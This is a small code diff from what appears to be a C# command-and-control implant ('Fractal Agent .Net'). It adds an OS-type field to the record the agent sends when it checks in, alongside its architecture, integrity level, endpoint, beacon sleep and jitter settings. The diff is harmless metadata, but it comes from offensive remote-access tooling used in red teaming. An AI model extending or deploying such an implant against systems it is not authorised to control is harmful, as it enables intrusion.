@@ -231,6 +231,7 @@ namespace EntryPoint
                     Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                     Integrity = integrity,
                     EndPoint = endpoint,
+                    OsType = osType,
                     Version = "Fractal Agent .Net" + " (" + osType + ") " + Assembly.GetExecutingAssembly().GetName().Version.ToString(),
                     SleepInterval = endpoint.ToLower().StartsWith("http") ? 2 : 0, //pivoting agent
                     SleepJitter = 0
